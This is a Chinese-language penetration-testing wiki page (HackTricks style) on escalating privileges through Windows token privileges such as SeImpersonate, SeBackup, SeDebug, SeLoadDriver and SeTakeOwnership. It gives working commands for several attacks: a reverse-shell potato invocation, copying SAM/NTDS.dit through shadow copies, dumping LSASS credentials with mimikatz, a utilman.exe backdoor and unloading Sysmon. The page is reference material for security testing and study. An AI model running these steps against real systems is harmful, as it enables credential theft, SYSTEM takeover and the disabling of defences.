# 利用 Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

如果你**不知道 Windows Access Tokens 是什么**，请先阅读本页再继续：


{{#ref}}
access-tokens.md
{{#endref}}

**也许你可以利用你已经拥有的 tokens 来提升权限**

### SeImpersonatePrivilege

这是任何进程都持有的一项 privilege，只要能获取到某个 token 的句柄，就允许对其进行 impersonation（但不能创建）。可以通过诱导一个 Windows service (DCOM) 对 exploit 执行 NTLM authentication，从而从 Windows service 获取 privileged token，随后使一个进程以 SYSTEM privileges 执行。这个漏洞可以使用多种工具进行利用，例如 [juicy-potato](https://github.com/ohpe/juicy-potato)、[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)（需要 winrm 被禁用）、[SweetPotato](https://github.com/CCob/SweetPotato) 和 [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)。

Modern operator notes:

- **JuicyPotato is legacy**: 在 Windows 10 1809+/Server 2019+ 上，优先使用 **GodPotato**、**SigmaPotato**、**PrintNotifyPotato**、**RoguePotato**、**SharpEfsPotato/EfsPotato** 或 **PrintSpoofer**，具体取决于仍然可达的 RPC/COM surface。
- 如果你已经攻陷了以 **`LOCAL SERVICE`** 或 **`NETWORK SERVICE`** 运行的 service，并且 `whoami /priv` 显示的是一个**filtered token**，没有 `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`，先恢复该 account 的**default privilege set**（例如使用 **FullPowers**），然后再重试 potato family。
- 一些较新的 fork 对 operator 更友好。比如，**SigmaPotato** 增加了 reflection/in-memory execution 和现代 Windows 兼容性，而 **PrintNotifyPotato** 利用了 PrintNotify COM service，在经典 Spooler 路径被禁用时通常很有用。
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

它与 **SeImpersonatePrivilege** 非常相似，会使用**相同的方法**获取特权 token。\
然后，这个权限允许将**主 token** 赋给一个新的/挂起的进程。使用特权模拟 token 你可以派生出一个主 token（DuplicateTokenEx）。\
有了这个 token，你可以用 'CreateProcessAsUser' 创建一个**新进程**，或者创建一个挂起进程并**设置 token**（通常，你不能修改正在运行的进程的主 token）。

### SeTcbPrivilege

如果你启用了这个 token，你可以使用 **KERB_S4U_LOGON** 在不知道凭据的情况下为任何其他用户获取一个**模拟 token**，向 token 中**添加任意组**（admins），将 token 的**完整性级别**设置为 "**medium**"，并将这个 token 赋给**当前线程**（SetThreadToken）。

### SeBackupPrivilege

该权限会使系统**授予对任何文件的全部读访问**控制（仅限读取操作）。它用于从注册表中**读取本地 Administrator** 账户的密码哈希，随后可以将该哈希用于 "**psexec**" 或 "**wmiexec**" 等工具（Pass-the-Hash technique）。然而，这种技术在两种情况下会失效：当 Local Administrator 账户被禁用时，或者当策略移除了远程连接的 Local Administrators 的管理员权限时。\
在实践中，最可靠的内置流程通常是 **VSS + `robocopy /b`**：创建/暴露一个影子副本，然后以**备份模式**复制 `SAM`/`SYSTEM` 或 `NTDS.dit`，这样可以绕过文件 ACL。
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
你可以用以下方式**滥用这个特权**：

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- 按照 **IppSec** 在 [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) 中的做法
- 或者如下面 **escalating privileges with Backup Operators** 部分所解释的：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

此特权提供对任何系统文件的**写入访问**权限，而不受文件的 Access Control List (ACL) 约束。它开启了许多提权可能性，包括能够**修改 services**、执行 DLL Hijacking，以及通过 Image File Execution Options 设置**debuggers** 等多种技术。

### SeCreateTokenPrivilege

SeCreateTokenPrivilege 是一个强大的权限，尤其在用户具备 impersonate tokens 能力时非常有用，即使没有 SeImpersonatePrivilege 也同样如此。其能力取决于是否能够 impersonate 一个代表同一用户、且 integrity level 不高于当前进程的 token。

**Key Points:**

- **Without SeImpersonatePrivilege 的 impersonation：** 在特定条件下，可以利用 SeCreateTokenPrivilege 通过 impersonating tokens 实现 EoP。
- **Token Impersonation 的条件：** 成功 impersonation 需要目标 token 属于同一用户，并且其 integrity level 小于或等于尝试 impersonation 的进程的 integrity level。
- **创建和修改 Impersonation Tokens：** 用户可以创建一个 impersonation token，并通过添加一个特权组的 SID (Security Identifier) 来增强它。

### SeLoadDriverPrivilege

此特权允许通过创建一个包含 `ImagePath` 和 `Type` 特定值的 registry 项来**加载和卸载 device drivers**。由于对 `HKLM` (HKEY_LOCAL_MACHINE) 的直接写入访问是受限的，因此必须改用 `HKCU` (HKEY_CURRENT_USER)。不过，为了让 kernel 能够识别 `HKCU` 中的 driver 配置，必须遵循特定的路径。

现代 offensive 用法通常是 **BYOVD** (bring your own vulnerable driver)：加载一个**已签名但存在漏洞的** kernel driver，然后利用其 IOCTLs 来关闭 protections 或跳转到 kernel code execution。请注意，在较新的 Windows 11/Server build 上，**Microsoft vulnerable driver blocklist** 和/或 **HVCI/Memory Integrity** 往往会破坏旧的 public chain，因此经典的 `szkg64.sys` 风格示例不再普遍可靠。

该路径为 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`，其中 `<RID>` 是当前用户的 Relative Identifier。在 `HKCU` 中必须创建整个路径，并设置两个值：

- `ImagePath`，即要执行的 binary 的路径
- `Type`，其值为 `SERVICE_KERNEL_DRIVER` (`0x00000001`)。

**Steps to Follow:**

1. 由于写入权限受限，访问 `HKCU` 而不是 `HKLM`。
2. 在 `HKCU` 中创建路径 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`，其中 `<RID>` 表示当前用户的 Relative Identifier。
3. 将 `ImagePath` 设置为 binary 的执行路径。
4. 将 `Type` 设为 `SERVICE_KERNEL_DRIVER` (`0x00000001`)。
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
在 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege) 中滥用此特权的更多方法

### SeTakeOwnershipPrivilege

这与 **SeRestorePrivilege** 类似。其主要功能允许进程**接管对象的所有权**，通过提供 WRITE_OWNER access rights 来绕过对显式 discretionary access 的要求。这个过程首先是为写入目的获取目标 registry key 的所有权，然后修改 DACL 以启用写操作。
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

此特权允许**debug other processes**，包括读取和写入内存。借助此特权，可以使用各种 memory injection 策略，且能够规避大多数 antivirus 和 host intrusion prevention 解决方案。

在现代 Windows 上，请记住，`SeDebugPrivilege` 通常足以打开**非受保护的 SYSTEM processes**并复制它们的 tokens，但它**不能保证**你可以接触到**LSASS**。如果启用了**RunAsPPL / LSA Protection**，即使存在 `SeDebugPrivilege`，非受保护进程也无法读取或注入 LSASS。在这种情况下，从另一个非 PPL 的 SYSTEM process 中窃取 token，或者先链上 PPL bypass/BYOVD，而不是假设 `procdump` 一定能工作。关于使用 `SeDebugPrivilege` + `SeImpersonatePrivilege` 的完整 token-copy 示例，请查看[这一页](sedebug-+-seimpersonate-copy-token.md)。

#### Dump memory

你可以使用来自 [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) 的 [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 来**捕获某个进程的内存**。具体来说，这可以用于 **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** 进程，它负责在用户成功登录系统后存储用户凭据。

然后你可以在 mimikatz 中加载这个 dump 来获取密码：
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

如果你想获得一个 `NT SYSTEM` shell，可以使用：

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

这个权限（Perform volume maintenance tasks）允许打开原始卷设备句柄（例如，\\.\C:），用于绕过 NTFS ACLs 的直接磁盘 I/O。借助它，你可以通过读取底层块来复制该卷上任何文件的字节，从而实现对敏感内容的任意文件读取（例如，%ProgramData%\Microsoft\Crypto\ 中的机器私钥、registry hives、SAM/NTDS via VSS）。它在 CA servers 上尤其有影响，因为导出 CA private key 后，可以伪造 Golden Certificate 来冒充任何 principal。

查看详细技术和缓解措施：

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
**显示为 Disabled 的 tokens** 通常可以被启用，因此你通常可以滥用 _Enabled_ 和 _Disabled_ 两种 privileges。

### Enable All the tokens

如果你有 disabled privileges，你可以使用脚本 [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 来启用所有 tokens：
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| --------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`**   | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | 通过 `robocopy /b` 或专门的 SeBackup-aware 复制辅助工具读取敏感文件。                                                                                                                                                                                                                                                                 | <p>- 适用于 `SAM`/`SYSTEM`、`SECURITY`、`NTDS.dit`，有时也适用于 `%WINDIR%\MEMORY.DMP`。<br><br>- `robocopy` 很方便，但专门的 SeBackup cmdlets/APIs 往往对锁定/已打开文件更灵活。</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | 使用 `NtCreateToken` 创建任意 token，包括本地管理员权限。                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | 复制一个**非 PPL** 的 SYSTEM token，或从未受保护的进程中转储内存。                                                                                                                                                                                                                                                                 | <p>如果启用了 RunAsPPL/LSA Protection，通常会阻止 LSASS dumping。</p><p>Script 可见于 [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | 使用 **Potato family** / named-pipe impersonation 启动 SYSTEM（`PrintSpoofer`、`RoguePotato`、`GodPotato`、`SigmaPotato`、`PrintNotifyPotato` 等）。                                                                                                                                                                                    | <p>最适合在服务账户中利用，例如 IIS APPPOOL、MSSQL、scheduled tasks，或任何已经拥有 `SeImpersonatePrivilege` 的上下文。</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. 加载一个已签名但存在漏洞的 kernel driver（BYOVD）<br>2. 使用 driver 的 IOCTL 获取 kernel R/W、禁用安全工具，或提升到 SYSTEM<br><br>另外，也可用该 privilege 通过内置命令 <code>fltMC</code> 卸载与安全相关的 driver，例如 <code>fltMC sysmondrv</code></p>                     | <p>像 <code>szkg64.sys</code> 这样的旧公开 driver 在现代 Windows 上正越来越多地被 vulnerable-driver blocklist / HVCI 阻止。</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. 以存在 SeRestore privilege 的状态启动 PowerShell/ISE。<br>2. 使用 <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) 启用该 privilege。<br>3. 将 utilman.exe 重命名为 utilman.old<br>4. 将 cmd.exe 重命名为 utilman.exe<br>5. 锁定控制台并按 Win+U</p> | <p>某些 AV software 可能会检测到这种攻击。</p><p>另一种方法是使用相同的 privilege 替换存放在 "Program Files" 中的 service binaries</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. 将 cmd.exe 重命名为 utilman.exe<br>4. 锁定控制台并按 Win+U</p>                                                                                                                                       | <p>某些 AV software 可能会检测到这种攻击。</p><p>另一种方法是使用相同的 privilege 替换存放在 "Program Files" 中的 service binaries。</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>操纵 token，使其包含本地管理员权限。可能需要 SeImpersonate。</p><p>待验证。</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- 看看这张定义 Windows tokens 的表：[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- 看看 [**这篇 paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) 了解使用 tokens 进行 privesc。
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
